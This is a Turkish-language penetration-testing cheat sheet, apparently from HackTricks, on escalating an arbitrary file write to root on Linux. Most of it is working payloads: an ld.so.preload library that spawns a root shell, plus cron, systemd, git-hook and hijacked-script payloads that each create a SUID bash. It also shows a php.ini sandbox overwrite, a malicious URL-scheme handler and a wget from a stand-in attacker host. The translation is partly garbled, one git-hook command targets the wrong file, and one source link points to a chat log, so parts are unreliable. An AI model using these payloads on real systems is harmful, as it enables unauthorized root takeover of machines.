# Root'a Keyfi Dosya Yazma

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Bu dosya **`LD_PRELOAD`** ortam değişkeni gibi davranır ama ayrıca **SUID binaries** içinde de çalışır.\
Eğer bunu oluşturabiliyor veya değiştirebiliyorsanız, her çalıştırılan binary ile yüklenecek bir kütüphanenin **yolunu** ekleyebilirsiniz.

Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) bir git deposunda bir commit oluşturulduğunda, merge... gibi çeşitli **events** üzerinde **run** edilen **scripts**'dir. Eğer bu işlemleri sık sık yapan bir **privileged script or user** varsa ve **write in the `.git` folder** mümkünse, bu **privesc** için kullanılabilir.

For example, It's possible to **bir script oluşturmak** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Zaman dosyaları

Eğer **root tarafından çalıştırılan cron-related dosyaları yazabiliyorsanız**, genellikle iş bir sonraki çalıştırmada kod yürütmesi elde edebilirsiniz. İlginç hedefler şunlardır:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root'un kendi crontab'ı `/var/spool/cron/` veya `/var/spool/cron/crontabs/` içinde
- `systemd` timers ve tetikledikleri servisler

Hızlı kontroller:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipik kötüye kullanım yolları:

- **Yeni bir root cron job ekleyin** `/etc/crontab`'a veya `/etc/cron.d/` içindeki bir dosyaya
- **Zaten `run-parts` tarafından çalıştırılan bir script'i değiştirin**
- **Mevcut bir timer target'e backdoor ekleyin** başlattığı script veya binary'i değiştirerek

Minimal cron payload örneği:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Eğer yalnızca `run-parts` tarafından kullanılan bir cron dizinine yazabiliyorsanız, bunun yerine çalıştırılabilir bir dosya bırakın:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notlar:

- `run-parts` genellikle nokta içeren dosya adlarını yoksayar, bu yüzden `backup.sh` yerine `backup` gibi isimleri tercih edin.
- Bazı distro'lar klasik cron yerine `anacron` veya `systemd` timers kullanır, ancak kötüye kullanım fikri aynıdır: **root'un daha sonra yürüteceği şeyi değiştirin**.

### Servis & Socket dosyaları

Eğer **`systemd` unit files** veya bunlar tarafından referans verilen dosyaları yazabiliyorsanız, birimi yeniden yükleyip yeniden başlatarak veya service/socket aktivasyon yolunun tetiklenmesini bekleyerek root olarak kod yürütmesi elde edebilirsiniz.

İlginç hedefler şunlardır:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths loaded by a root service

Hızlı kontroller:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Yaygın istismar yolları:

- **Overwrite `ExecStart=`** root sahibine ait ve değiştirebildiğiniz bir service unit'ünde
- **Add a drop-in override** kötü amaçlı bir `ExecStart=` ile ve önce eskisini temizleyerek bir override ekleyin
- **Backdoor the script/binary** birim tarafından zaten referans verilen dosyaya backdoor yerleştirin
- **Hijack a socket-activated service** ilgili `.service` dosyasını değiştirerek; bu dosya soket bağlantısı alındığında başlatılır

Example malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipik etkinleştirme akışı:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Eğer servisleri kendiniz yeniden başlatamıyorsanız ancak bir socket-activated unit'i düzenleyebiliyorsanız, root olarak backdoored service'in çalıştırılmasını tetiklemek için yalnızca **bir istemci bağlantısının gelmesini beklemeniz** gerekebilir.

### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox

Bazı özel daemon'lar, kullanıcı tarafından sağlanan PHP'yi `php` ile **kısıtlı bir `php.ini`** kullanarak doğrular (örneğin, `disable_functions=exec,system,...`). Eğer sandbox'lanan kodda hâlâ **any write primitive** (örneğin `file_put_contents`) varsa ve daemon tarafından kullanılan **exact `php.ini` path**'ine ulaşabiliyorsanız, kısıtlamaları kaldırmak için **o konfigürasyonu üzerine yazabilir** ve ardından yükseltilmiş ayrıcalıklarla çalışan ikinci bir payload gönderebilirsiniz.

Tipik akış:

1. İlk payload sandbox konfigürasyonunu üzerine yazar.
2. İkinci payload, tehlikeli fonksiyonlar yeniden etkinleştirildiği için kodu çalıştırır.

Minimal örnek (daemon tarafından kullanılan yolu değiştirin):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Eğer daemon root olarak çalışıyorsa (veya root'a ait yollarla doğrulama yapıyorsa), ikinci yürütme root bağlamı sağlar. Bu, sandboxed runtime hâlâ dosya yazabiliyorsa aslında **privilege escalation via config overwrite**'a eşdeğerdir.

### binfmt_misc

`/proc/sys/fs/binfmt_misc` içinde yer alan dosya hangi ikili dosyanın hangi tür dosyaları çalıştırması gerektiğini belirtir. TODO: yaygın bir dosya türü açıkken bunu kullanıp rev shell çalıştırmak için gereken şartları kontrol et.

### Şema handler'larını (ör. http: veya https:) üzerine yazma

Bir saldırgan, hedefin yapılandırma dizinlerine yazma iznine sahipse, sistem davranışını değiştirecek dosyaları kolayca değiştirebilir veya oluşturabilir ve istenmeyen kod yürütülmesine yol açabilir. `$HOME/.config/mimeapps.list` dosyasını HTTP ve HTTPS URL handler'larını kötü amaçlı bir dosyaya gösterecek şekilde değiştirerek (ör. `x-scheme-handler/http=evil.desktop` ayarlamak), saldırgan **herhangi bir http veya https bağlantısına tıklamanın `evil.desktop` içindeki belirtilen kodu tetiklemesini** sağlar. Örneğin, `$HOME/.local/share/applications` içinde `evil.desktop` dosyasına aşağıdaki kötü amaçlı kodu yerleştirdikten sonra, herhangi bir dış URL'ye tıklama gömülü komutu çalıştırır:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.

### Root tarafından çalıştırılan user-writable scripts/binaries

Eğer ayrıcalıklı bir workflow şu gibi bir şey çalıştırıyorsa `/bin/sh /home/username/.../script` (veya yetkisiz bir kullanıcının sahip olduğu bir dizindeki herhangi bir binary), bunu ele geçirebilirsiniz:

- **Çalıştırmayı tespit et:** root'un user-controlled paths çağırmasını yakalamak için süreçleri [pspy](https://github.com/DominicBreuker/pspy) ile izleyin:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Yazılabilirliği doğrulayın:** hedef dosyanın ve dizinin kullanıcı hesabınız tarafından sahiplenilmiş ve yazılabilir olduğundan emin olun.
- **Hedefi ele geçirin:** orijinal binary/script'in yedeğini alın ve SUID shell (veya başka herhangi bir root action) oluşturan bir payload bırakın, sonra izinleri geri yükleyin:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Ayrıcalıklı işlemi tetikleyin** (ör. yardımcıyı başlatan bir UI düğmesine basmak). root tekrar ele geçirilmiş yolu çalıştırdığında, yükseltilmiş shell'i `./rootshell -p` ile alın.

## Referanslar

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
